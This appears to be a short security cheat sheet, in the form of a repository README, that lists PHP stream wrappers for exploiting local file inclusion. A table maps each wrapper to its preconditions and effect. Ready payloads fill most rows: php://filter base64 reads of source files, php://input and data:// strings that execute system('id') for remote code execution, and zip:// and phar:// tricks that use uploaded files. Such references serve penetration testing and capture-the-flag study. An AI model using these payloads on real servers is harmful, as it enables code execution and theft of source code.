# lfi-phpwrappers

List of PHP Wrappers for Local File Inclusion

| Wrapper | Controllable Function | allow_url_include? | Vulnerability | Notes |
| --- | --- | --- | --- | --- |
| file:// | None | Off | LFI / File Manipulation | - |
| glob://	| None | Off| Directory Traversal	| - |
| php://filter/read	| include |	Off	| File Disclosure	| php://filter/read=convert.base64-encode/resource=index.php |
| php://filter/write | file_put_contents| Off | Encoding | file_put_contents("php://filter/write=string.rot13/resource=x.txt","content"); |
| php://input | include | On | RCE | Encoding is required while reading .php source: <?php echo base64_encode(file_get_contents("solution.php"));?> OR just use <?php system('cat x.php');?> |
| data://	| include	| On | RCE	| data:text/plain,<?php system("id")?> OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4= |
| zip:// | include + uploaded file | Off | RCE | zip://shell.jpg%23payload.php |
| phar:// | include + uploaded file | Off | RCE | PHP version >= 5.3 |

References:
https://www.cdxy.me/?p=752
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
